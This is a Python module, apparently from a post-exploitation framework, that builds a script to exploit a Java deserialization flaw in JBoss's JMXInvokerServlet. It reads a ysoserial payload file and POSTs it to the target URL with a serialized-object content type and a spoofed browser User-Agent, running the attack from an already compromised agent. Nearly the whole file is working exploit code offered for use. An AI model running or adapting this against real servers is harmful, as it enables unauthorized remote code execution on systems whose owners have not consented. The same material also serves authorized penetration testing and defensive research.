class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Jboss JMXInvoker Java Serialization Exploitation',
            'Author': ['@424f424f'],
            'Description': ('Exploit JBoss java serialization flaw. Requires upload of ysoserial payload.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ["Generate Payload with https://github.com/frohoff/ysoserial"]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'URL' : {
                'Description'   :   'URL to JMXInvoker',
                'Required'      :   True,
                'Value'         :   'http://127.0.0.1:8080/invoker/JMXInvokerServlet'
            },
            'Payload' : {
                'Description'   :   'Path to ysoserial payload.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        url = self.options['URL']['Value']
        payload = self.options['Payload']['Value']
        script = """
import urllib2
try:
    with open('%s', 'rb') as f:
        data=f.read()
except Exception as e:
    print "Failure reading payload: " + str(e)
url = '%s'
try:
    request = urllib2.Request(url, data)
    request.add_header('User-Agent',
                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
    request.add_header('Content-Type', 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue')
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    content = opener.open(request).read()
except Exception as e:
    print "Failure sending payload: " + str(e)
print "Finished"
""" % (payload, url)
        return script